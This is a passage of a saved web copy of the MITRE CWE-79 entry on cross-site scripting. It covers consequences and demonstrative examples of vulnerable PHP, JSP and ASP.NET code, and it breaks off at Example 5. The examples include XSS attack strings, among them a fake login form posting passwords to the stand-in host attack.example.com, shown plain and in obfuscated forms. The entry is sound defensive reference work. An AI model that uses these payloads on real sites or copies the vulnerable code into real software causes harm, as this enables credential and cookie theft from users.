+Base weakness.</span></span></td><td valign="top">74</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/74.html" target="_blank" rel="noopener noreferrer">Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')</a></td></tr></tbody></table></div></div></div></div></div></div><div id="relevant_table"><div class="reltable"><span id="script"><a href="javascript:toggleblocksOC('79_1008_relevant_table');"><img id="ocimg_79_1008_relevant_table" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_less.gif" alt="+" border="0"></a> </span>Relevant to the view "Architectural Concepts" (CWE-1008)<div name="oc_79_1008_relevant_table" id="oc_79_1008_relevant_table" class="collapseblock"><div class="tabledetail"><div class="indent"><div xmlns:saxon="http://saxon.sf.net/" xmlns:xalan="http://xml.apache.org/xalan" class="tabledetail"><table id="Detail" width="98%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><th width="110px" valign="top">Nature</th><th width="40px" valign="top">Type</th><th width="50px" valign="top">ID</th><th valign="top">Name</th></tr></tbody><tbody><tr class="primary Category"><td valign="top">MemberOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/category.gif" alt="Category" class="icon"><span class="tip">Category - a CWE entry that contains a set of other entries that share a common characteristic.</span></span></td><td valign="top">1019</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/1019.html" target="_blank" rel="noopener noreferrer">Validate Inputs</a></td></tr></tbody></table></div></div></div></div></div></div><div id="relevant_table"><div class="reltable"><span id="script"><a href="javascript:toggleblocksOC('79_699_relevant_table');"><img id="ocimg_79_699_relevant_table" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_less.gif" alt="+" border="0"></a> </span>Relevant to the view "Development Concepts" (CWE-699)<div name="oc_79_699_relevant_table" id="oc_79_699_relevant_table" class="collapseblock"><div class="tabledetail"><div class="indent"><div xmlns:saxon="http://saxon.sf.net/" xmlns:xalan="http://xml.apache.org/xalan" class="tabledetail"><table id="Detail" width="98%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><th width="110px" valign="top">Nature</th><th width="40px" valign="top">Type</th><th width="50px" valign="top">ID</th><th valign="top">Name</th></tr></tbody><tbody><tr class="primary Category"><td valign="top">MemberOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/category.gif" alt="Category" class="icon"><span class="tip">Category - a CWE entry that contains a set of other entries that share a common characteristic.</span></span></td><td valign="top">442</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/442.html" target="_blank" rel="noopener noreferrer">Web Problems</a></td></tr><tr class="primary Weakness"><td valign="top">ChildOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/class.gif" alt="Class" class="icon"><span class="tip">Class
+ - a weakness that is described in a very abstract fashion, typically 
+independent of any specific language or technology. More general than a 
+Base weakness.</span></span></td><td valign="top">74</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/74.html" target="_blank" rel="noopener noreferrer">Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')</a></td></tr><tr class="primary Weakness"><td valign="top">ParentOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/variant.gif" alt="Variant" class="icon"><span class="tip">Variant
+ - a weakness that is described at a very low level of detail, typically
+ limited to a specific language or technology. More specific than a Base
+ weakness.</span></span></td><td valign="top">80</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/80.html" target="_blank" rel="noopener noreferrer">Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></td></tr><tr class="primary Weakness"><td valign="top">ParentOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/variant.gif" alt="Variant" class="icon"><span class="tip">Variant
+ - a weakness that is described at a very low level of detail, typically
+ limited to a specific language or technology. More specific than a Base
+ weakness.</span></span></td><td valign="top">81</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/81.html" target="_blank" rel="noopener noreferrer">Improper Neutralization of Script in an Error Message Web Page</a></td></tr><tr class="primary Weakness"><td valign="top">ParentOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/variant.gif" alt="Variant" class="icon"><span class="tip">Variant
+ - a weakness that is described at a very low level of detail, typically
+ limited to a specific language or technology. More specific than a Base
+ weakness.</span></span></td><td valign="top">83</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/83.html" target="_blank" rel="noopener noreferrer">Improper Neutralization of Script in Attributes in a Web Page</a></td></tr><tr class="primary Weakness"><td valign="top">ParentOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/variant.gif" alt="Variant" class="icon"><span class="tip">Variant
+ - a weakness that is described at a very low level of detail, typically
+ limited to a specific language or technology. More specific than a Base
+ weakness.</span></span></td><td valign="top">84</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/84.html" target="_blank" rel="noopener noreferrer">Improper Neutralization of Encoded URI Schemes in a Web Page</a></td></tr><tr class="primary Weakness"><td valign="top">ParentOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/variant.gif" alt="Variant" class="icon"><span class="tip">Variant
+ - a weakness that is described at a very low level of detail, typically
+ limited to a specific language or technology. More specific than a Base
+ weakness.</span></span></td><td valign="top">85</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/85.html" target="_blank" rel="noopener noreferrer">Doubled Character XSS Manipulations</a></td></tr><tr class="primary Weakness"><td valign="top">ParentOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/variant.gif" alt="Variant" class="icon"><span class="tip">Variant
+ - a weakness that is described at a very low level of detail, typically
+ limited to a specific language or technology. More specific than a Base
+ weakness.</span></span></td><td valign="top">86</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/86.html" target="_blank" rel="noopener noreferrer">Improper Neutralization of Invalid Characters in Identifiers in Web Pages</a></td></tr><tr class="primary Weakness"><td valign="top">ParentOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/variant.gif" alt="Variant" class="icon"><span class="tip">Variant
+ - a weakness that is described at a very low level of detail, typically
+ limited to a specific language or technology. More specific than a Base
+ weakness.</span></span></td><td valign="top">87</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/87.html" target="_blank" rel="noopener noreferrer">Improper Neutralization of Alternate XSS Syntax</a></td></tr></tbody></table></div></div></div></div></div></div></div></div></div></div><div id="Background_Details"><div class="heading"><span id="script"><a href="javascript:toggleblocksOC('79_Background_Details');"><img id="ocimg_79_Background_Details" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_more.gif" alt="+" border="0"></a> </span>Background Details</div><div name="oc_79_Background_Details" id="oc_79_Background_Details" class="expandblock"><div class="detail"><div class="indent"><div id="Grouped"><div style="color:#32498D; font-weight:bold;">Same Origin Policy</div><p>The
+ same origin policy states that browsers should limit the resources 
+accessible to scripts running on a given web site, or "origin", to the 
+resources associated with that web site on the client-side, and not the 
+client-side resources of any other sites or "origins". The goal is to 
+prevent one site from being able to modify or read the contents of an 
+unrelated site. Since the World Wide Web involves interactions between 
+many sites, this policy is important for browsers to enforce.</p><div style="color:#32498D; font-weight:bold;">Domain</div><p>The
+ Domain of a website when referring to XSS is roughly equivalent to the 
+resources associated with that website on the client-side of the 
+connection. That is, the domain can be thought of as all resources the 
+browser is storing for the user's interactions with this particular 
+site.</p><table class="Detail" width="98%" cellspacing="0" cellpadding="0" border="0">
+            
+               
+               
+               
+               
+            
+         </table></div></div></div></div></div><div id="Modes_Of_Introduction"><div class="heading"><span id="script"><a href="javascript:toggleblocksOC('79_Modes_Of_Introduction');"><img id="ocimg_79_Modes_Of_Introduction" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_more.gif" alt="+" border="0"></a> </span>Modes Of Introduction</div><div name="oc_79_Modes_Of_Introduction" id="oc_79_Modes_Of_Introduction" class="expandblock"><div class="tabledetail"><div class="indent"><p>The
+ different Modes of Introduction provide information about how and when 
+this weakness may be introduced. The Phase identifies a point in the 
+software life cycle at which introduction may occur, while the Note 
+provides a typical scenario related to introduction during the given 
+phase.</p><table id="Detail" width="98%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><th width="110px" valign="middle">Phase</th><th valign="middle">Note</th></tr><tr><td valign="middle" nowrap="nowrap">Architecture and Design</td><td width="100%" valign="middle"></td></tr><tr><td valign="middle" nowrap="nowrap">Implementation</td><td width="100%" valign="middle">REALIZATION: This weakness is caused during implementation of an architectural security tactic. </td></tr></tbody></table></div></div></div></div><div id="Applicable_Platforms"><div class="heading"><span id="script"><a href="javascript:toggleblocksOC('79_Applicable_Platforms');"><img id="ocimg_79_Applicable_Platforms" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_more.gif" alt="+" border="0"></a> </span>Applicable Platforms</div><div name="oc_79_Applicable_Platforms" id="oc_79_Applicable_Platforms" class="expandblock"><div class="detail"><div class="indent">The
+ listings below show possible areas for which the given weakness could 
+appear. These may be for specific named Languages, Operating Systems, 
+Architectures, Paradigms, Technologies, or a class of such platforms. 
+The platform is listed along with how frequently the given weakness 
+appears for that instance.<p class="subheading">Languages</p><div class="indent"><p> Class: Language-Independent <span class="smaller" style="font-style:italic">(Undetermined Prevalence)</span></p></div><p class="subheading">Paradigms</p><div class="indent"><p>Web Based <span class="smaller" style="font-style:italic">(Often Prevalent)</span></p></div><p class="subheading">Technologies</p><div class="indent"><p>Web Server <span class="smaller" style="font-style:italic">(Often Prevalent)</span></p></div></div></div></div></div><div id="Common_Consequences"><div class="heading"><span id="script"><a href="javascript:toggleblocksOC('79_Common_Consequences');"><img id="ocimg_79_Common_Consequences" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_more.gif" alt="+" border="0"></a> </span>Common Consequences</div><div name="oc_79_Common_Consequences" id="oc_79_Common_Consequences" class="expandblock"><div class="tabledetail"><div class="indent"><p>The
+ table below specifies different individual consequences associated with
+ the weakness. The Scope identifies the application security area that 
+is violated, while the Impact describes the negative technical impact 
+that arises if an adversary succeeds in exploiting this weakness. The 
+Likelihood provides information about how likely the specific 
+consequence is expected to be seen relative to the other consequences in
+ the list. For example, there may be high likelihood that a weakness 
+will be exploited to achieve a certain impact, but a low likelihood that
+ it will be exploited to achieve a different impact. </p><table id="Detail" width="98%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><th width="135px" valign="middle" nowrap="nowrap">Scope</th><th valign="middle">Impact</th><th width="100px" valign="middle" nowrap="nowrap">Likelihood</th></tr><tr><td valign="middle" nowrap="nowrap">Access Control<br>Confidentiality<br></td><td width="100%" valign="middle"><div style="padding-top:5px"><p class="smaller" style="font-weight:normal"><span class="subheading">Technical Impact:</span><i> Bypass Protection Mechanism; Read Application Data</i></p></div><div style="padding-top:5px">The
+ most common attack performed with cross-site scripting involves the 
+disclosure of information stored in user cookies. Typically, a malicious
+ user will craft a client-side script, which -- when parsed by a web 
+browser -- performs some activity (such as sending all site cookies to a
+ given E-mail address). This script will be loaded and run by each user 
+visiting the web site. Since the site requesting to run the script has 
+access to the cookies in question, the malicious script does also. </div></td><td valign="middle" nowrap="nowrap"></td></tr><tr><td valign="middle" nowrap="nowrap">Integrity<br>Confidentiality<br>Availability<br></td><td width="100%" valign="middle"><div style="padding-top:5px"><p class="smaller" style="font-weight:normal"><span class="subheading">Technical Impact:</span><i> Execute Unauthorized Code or Commands</i></p></div><div style="padding-top:5px">In
+ some circumstances it may be possible to run arbitrary code on a 
+victim's computer when cross-site scripting is combined with other 
+flaws. </div></td><td valign="middle" nowrap="nowrap"></td></tr><tr><td valign="middle" nowrap="nowrap">Confidentiality<br>Integrity<br>Availability<br>Access Control<br></td><td width="100%" valign="middle"><div style="padding-top:5px"><p class="smaller" style="font-weight:normal"><span class="subheading">Technical Impact:</span><i> Execute Unauthorized Code or Commands; Bypass Protection Mechanism; Read Application Data</i></p></div><div style="padding-top:5px">The
+ consequence of an XSS attack is the same regardless of whether it is 
+stored or reflected. The difference is in how the payload arrives at the
+ server. XSS can cause a variety of problems for the end user that range
+ in severity from an annoyance to complete account compromise. Some 
+cross-site scripting vulnerabilities can be exploited to manipulate or 
+steal cookies, create requests that can be mistaken for those of a valid
+ user, compromise confidential information, or execute malicious code on
+ the end user systems for a variety of nefarious purposes. Other 
+damaging attacks include the disclosure of end user files, installation 
+of Trojan horse programs, redirecting the user to some other page or 
+site, running "Active X" controls (under Microsoft Internet Explorer) 
+from sites that a user perceives as trustworthy, and modifying 
+presentation of content. </div></td><td valign="middle" nowrap="nowrap"></td></tr></tbody></table></div></div></div></div><div id="Likelihood_Of_Exploit"><div class="heading"><span id="script"><a href="javascript:toggleblocksOC('79_Likelihood_Of_Exploit');"><img id="ocimg_79_Likelihood_Of_Exploit" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_more.gif" alt="+" border="0"></a> </span>Likelihood Of Exploit</div><div name="oc_79_Likelihood_Of_Exploit" id="oc_79_Likelihood_Of_Exploit" class="expandblock"><div class="detail"><div class="indent">High</div></div></div></div><div id="Demonstrative_Examples"><div class="heading"><span id="script"><a href="javascript:toggleblocksOC('79_Demonstrative_Examples');"><img id="ocimg_79_Demonstrative_Examples" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_more.gif" alt="+" border="0"></a> </span>Demonstrative Examples</div><div name="oc_79_Demonstrative_Examples" id="oc_79_Demonstrative_Examples" class="expandblock"><div class="detail"><div class="indent"><p class="subheading">Example 1</p><p>This
+ code displays a welcome message on a web page based on the HTTP GET 
+username parameter. This example covers a Reflected XSS (Type 1) 
+scenario.</p><div class="indent bad"><div id="ExampleCode" style="clear:both; padding-top:5px; padding-bottom:5px;"><div class="shadow"><div class="CodeHead"><div style="float:right; font-style:italic; font-size:10px; color:#98A9B7">(bad code)</div><div class="optheading smaller"><span style="font-weight:normal; font-style:italic">Example Language: </span>PHP&nbsp;</div></div><div class="top">
+                  <div>$username = $_GET['username'];<br>echo '&lt;div class="header"&gt; Welcome, ' . $username . '&lt;/div&gt;';</div>
+               </div></div></div></div><p>Because the parameter can be arbitrary, the url of the page could be modified so $username contains scripting syntax, such as</p><div class="indent attack"><div id="ExampleCode" style="clear:both; padding-top:5px; padding-bottom:5px;"><div class="shadow"><div class="CodeHead"><div style="float:right; font-style:italic; font-size:10px; color:#98A9B7">(attack code)</div><div class="optheading smaller">&nbsp;</div></div><div class="top">
+                  <div>http://trustedSite.example.com/welcome.php?username=&lt;Script
+ Language="Javascript"&gt;alert("You've been attacked!");&lt;/Script&gt;</div>
+               </div></div></div></div><p>This results in a harmless 
+alert dialogue popping up. Initially this might not appear to be much of
+ a vulnerability. After all, why would someone enter a URL that causes 
+malicious code to run on their own computer? The real danger is that an 
+attacker will create the malicious URL, then use e-mail or social 
+engineering tricks to lure victims into visiting a link to the URL. When
+ victims click the link, they unwittingly reflect the malicious content 
+through the vulnerable web application back to their own computers.</p><p>More
+ realistically, the attacker can embed a fake login box on the page, 
+tricking the user into sending the user's password to the attacker:</p><div class="indent attack"><div id="ExampleCode" style="clear:both; padding-top:5px; padding-bottom:5px;"><div class="shadow"><div class="CodeHead"><div style="float:right; font-style:italic; font-size:10px; color:#98A9B7">(attack code)</div><div class="optheading smaller">&nbsp;</div></div><div class="top">
+                  <div>http://trustedSite.example.com/welcome.php?username=&lt;div
+ id="stealPassword"&gt;Please Login:&lt;form name="input" 
+action="http://attack.example.com/stealPassword.php" 
+method="post"&gt;Username: &lt;input type="text" name="username" 
+/&gt;&lt;br/&gt;Password: &lt;input type="password" name="password" 
+/&gt;&lt;br/&gt;&lt;input type="submit" value="Login" 
+/&gt;&lt;/form&gt;&lt;/div&gt;</div>
+               </div></div></div></div><p>If a user clicks on this link then Welcome.php will generate the following HTML and send it to the user's browser:</p><div class="indent result"><div id="ExampleCode" style="clear:both; padding-top:5px; padding-bottom:5px;"><div class="shadow"><div class="CodeHead"><div style="float:right; font-style:italic; font-size:10px; color:#98A9B7">(result)</div><div class="optheading smaller">&nbsp;</div></div><div class="top">
+                  <div>&lt;div class="header"&gt; Welcome, &lt;div id="stealPassword"&gt; Please Login:<div style="margin-left:10px;">
+                        <br>&lt;form name="input" action="attack.example.com/stealPassword.php" method="post"&gt;<div style="margin-left:10px;">Username: &lt;input type="text" name="username" /&gt;&lt;br/&gt;<br>Password: &lt;input type="password" name="password" /&gt;&lt;br/&gt;<br>&lt;input type="submit" value="Login" /&gt;</div>&lt;/form&gt;</div>
+                     <br>&lt;/div&gt;&lt;/div&gt;</div>
+               </div></div></div></div><p>The trustworthy domain of the 
+URL may falsely assure the user that it is OK to follow the link. 
+However, an astute user may notice the suspicious text appended to the 
+URL. An attacker may further obfuscate the URL (the following example 
+links are broken into multiple lines for readability):</p><div class="indent attack"><div id="ExampleCode" style="clear:both; padding-top:5px; padding-bottom:5px;"><div class="shadow"><div class="CodeHead"><div style="float:right; font-style:italic; font-size:10px; color:#98A9B7">(attack code)</div><div class="optheading smaller">&nbsp;</div></div><div class="top">
+                  <div>trustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22<br>stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input<br>%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php<br>%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text<br>%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A<br>+%3Cinput+type%3D%22password%22+name%3D%22password%22<br>+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22<br>+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A</div>
+               </div></div></div></div><p>The same attack string could also be obfuscated as:</p><div class="indent attack"><div id="ExampleCode" style="clear:both; padding-top:5px; padding-bottom:5px;"><div class="shadow"><div class="CodeHead"><div style="float:right; font-style:italic; font-size:10px; color:#98A9B7">(attack code)</div><div class="optheading smaller">&nbsp;</div></div><div class="top">
+                  <div>trustedSite.example.com/welcome.php?username=&lt;script+type="text/javascript"&gt;<br>document.write('\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073<br>\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064<br>\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067<br>\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D<br>\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063<br>\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F<br>\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D<br>\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061<br>\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068<br>\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070<br>\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D<br>\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079<br>\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061<br>\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065<br>\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073<br>\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075<br>\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073<br>\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022<br>\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E<br>\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D<br>\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C<br>\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F<br>\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D');&lt;/script&gt;</div>
+               </div></div></div></div><p>Both of these attack links 
+will result in the fake login box appearing on the page, and users are 
+more likely to ignore indecipherable text at the end of URLs.</p><p class="subheading">Example 2</p><p>This example also displays a Reflected XSS (Type 1) scenario.</p><p>The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.</p><div class="indent bad"><div id="ExampleCode" style="clear:both; padding-top:5px; padding-bottom:5px;"><div class="shadow"><div class="CodeHead"><div style="float:right; font-style:italic; font-size:10px; color:#98A9B7">(bad code)</div><div class="optheading smaller"><span style="font-weight:normal; font-style:italic">Example Language: </span>JSP&nbsp;</div></div><div class="top">
+                  <div>&lt;% String eid = request.getParameter("eid"); %&gt;<br>...<br>Employee ID: &lt;%= eid %&gt;</div>
+               </div></div></div></div><p>The following ASP.NET code segment reads an employee ID number from an HTTP request and displays it to the user.</p><div class="indent bad"><div id="ExampleCode" style="clear:both; padding-top:5px; padding-bottom:5px;"><div class="shadow"><div class="CodeHead"><div style="float:right; font-style:italic; font-size:10px; color:#98A9B7">(bad code)</div><div class="optheading smaller"><span style="font-weight:normal; font-style:italic">Example Language: </span>ASP.NET&nbsp;</div></div><div class="top">
+                  <div>&lt;%<br>protected System.Web.UI.WebControls.TextBox Login;<br>protected System.Web.UI.WebControls.Label EmployeeID;<br>...<br>EmployeeID.Text = Login.Text;<br>%&gt;<br>
+                     <br>&lt;p&gt;&lt;asp:label id="EmployeeID" runat="server" /&gt;&lt;/p&gt;</div>
+               </div></div></div></div><p>The code in this example 
+operates correctly if the Employee ID variable contains only standard 
+alphanumeric text. If it has a value that includes meta-characters or 
+source code, then the code will be executed by the web browser as it 
+displays the HTTP response.</p><p class="subheading">Example 3</p><p>This example covers a Stored XSS (Type 2) scenario.</p><p>The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.</p><div class="indent bad"><div id="ExampleCode" style="clear:both; padding-top:5px; padding-bottom:5px;"><div class="shadow"><div class="CodeHead"><div style="float:right; font-style:italic; font-size:10px; color:#98A9B7">(bad code)</div><div class="optheading smaller"><span style="font-weight:normal; font-style:italic">Example Language: </span>JSP&nbsp;</div></div><div class="top">
+                  <div>&lt;%Statement stmt = conn.createStatement();<br>ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);<br>if (rs != null) {<div style="margin-left:10px;">rs.next();<br>String name = rs.getString("name");</div>}%&gt;<br>
+                     <br>Employee Name: &lt;%= name %&gt;</div>
+               </div></div></div></div><p>The following ASP.NET code 
+segment queries a database for an employee with a given employee ID and 
+prints the name corresponding with the ID.</p><div class="indent bad"><div id="ExampleCode" style="clear:both; padding-top:5px; padding-bottom:5px;"><div class="shadow"><div class="CodeHead"><div style="float:right; font-style:italic; font-size:10px; color:#98A9B7">(bad code)</div><div class="optheading smaller"><span style="font-weight:normal; font-style:italic">Example Language: </span>ASP.NET&nbsp;</div></div><div class="top">
+                  <div>&lt;%<br>protected System.Web.UI.WebControls.Label EmployeeName;<br>...<br>string query = "select * from emp where id=" + eid;<br>sda = new SqlDataAdapter(query, conn);<br>sda.Fill(dt);<br>string name = dt.Rows[0]["Name"];<br>...<br>EmployeeName.Text = name;%&gt;<br>&lt;p&gt;&lt;asp:label id="EmployeeName" runat="server" /&gt;&lt;/p&gt;</div>
+               </div></div></div></div><p>This code can appear less 
+dangerous because the value of name is read from a database, whose 
+contents are apparently managed by the application. However, if the 
+value of name originates from user-supplied data, then the database can 
+be a conduit for malicious content. Without proper input validation on 
+all data stored in the database, an attacker can execute malicious 
+commands in the user's web browser.</p><p class="subheading">Example 4</p><p>The
+ following example consists of two separate pages in a web application, 
+one devoted to creating user accounts and another devoted to listing 
+active users currently logged in. It also displays a Stored XSS (Type 2)
+ scenario.</p><p>CreateUser.php</p><div class="indent bad"><div id="ExampleCode" style="clear:both; padding-top:5px; padding-bottom:5px;"><div class="shadow"><div class="CodeHead"><div style="float:right; font-style:italic; font-size:10px; color:#98A9B7">(bad code)</div><div class="optheading smaller"><span style="font-weight:normal; font-style:italic">Example Language: </span>PHP&nbsp;</div></div><div class="top">
+                  <div>$username = mysql_real_escape_string($username);<br>$fullName = mysql_real_escape_string($fullName);<br>$query = sprintf('Insert Into users (username,password) Values ("%s","%s","%s")', $username, crypt($password),$fullName) ;<br>mysql_query($query);<br>/.../</div>
+               </div></div></div></div><p>The code is careful to avoid a SQL injection attack (<a href="http://cwe.mitre.org/data/definitions/89.html">CWE-89</a>)
+ but does not stop valid HTML from being stored in the database. This 
+can be exploited later when ListUsers.php retrieves the information: </p><p>ListUsers.php</p><div class="indent bad"><div id="ExampleCode" style="clear:both; padding-top:5px; padding-bottom:5px;"><div class="shadow"><div class="CodeHead"><div style="float:right; font-style:italic; font-size:10px; color:#98A9B7">(bad code)</div><div class="optheading smaller"><span style="font-weight:normal; font-style:italic">Example Language: </span>PHP&nbsp;</div></div><div class="top">
+                  <div>$query = 'Select * From users Where loggedIn=true';<br>$results = mysql_query($query);<br>
+                     <br>if (!$results) {<div style="margin-left:10px;">exit;</div>}<br>
+                     <br>
+                     <i>//Print list of users to page</i>
+                     <br>echo '&lt;div id="userlist"&gt;Currently Active Users:';<br>while ($row = mysql_fetch_assoc($results)) {<div style="margin-left:10px;">echo '&lt;div class="userNames"&gt;'.$row['fullname'].'&lt;/div&gt;';</div>}<br>echo '&lt;/div&gt;';</div>
+               </div></div></div></div><p>The attacker can set their 
+name to be arbitrary HTML, which will then be displayed to all visitors 
+of the Active Users page. This HTML can, for example, be a password 
+stealing Login message.</p><p class="subheading">Example 5</p><p>Consider
+ an application that provides a simplistic message board that saves 
+messages in HTML format and appends them to a file.  When a new user 
+arrives in the room, it makes an announcement:</p><div class="indent bad"><div id="ExampleCode" style="clear:both; padding-top:5px; padding-bottom:5px;"><div class="shadow"><div class="CodeHead"><div style="float:right; font-style:italic; font-size:10px; color:#98A9B7">(bad code)</div><div class="optheading smaller"><span style="font-weight:normal; font-style:italic">Example Language: </span>PHP&nbsp;</div></div><div class="top">
+                  <div>$name = $_COOKIE["myname"];<br>$announceStr = "$name just logged in.";<br>
+                     <br>
+                     <i>//save HTML-formatted message to file; implementation details are irrelevant for this example.</i>
+                     <br>
+				saveMessage($announceStr);</div>
+               </div></div></div></div><p>An attacker may be able to perform an HTML injection (Type 2 XSS) attack by setting a cookie to a value like:</p><div class="indent attack"><div id="ExampleCode" style="clear:both; padding-top:5px; padding-bottom:5px;"><div class="shadow"><div class="CodeHead"><div style="float:right; font-style:italic; font-size:10px; color:#98A9B7">(attack code)</div><div class="optheading smaller">&nbsp;</div></div><div class="top">
+                  <div>&lt;script&gt;document.alert('Hacked');&lt;/script&gt;</div>
+               </div></div></div></div><p>The raw contents of the message file would look like:</p><div class="indent result"><div id="ExampleCode" style="clear:both; padding-top:5px; padding-bottom:5px;"><div class="shadow"><div class="CodeHead"><div style="float:right; font-style:italic; font-size:10px; color:#98A9B7">(result)</div><div class="optheading smaller">&nbsp;</div></div><div class="top">
+                  <div>&lt;script&gt;document.alert('Hacked');&lt;/script&gt; has logged in.</div>
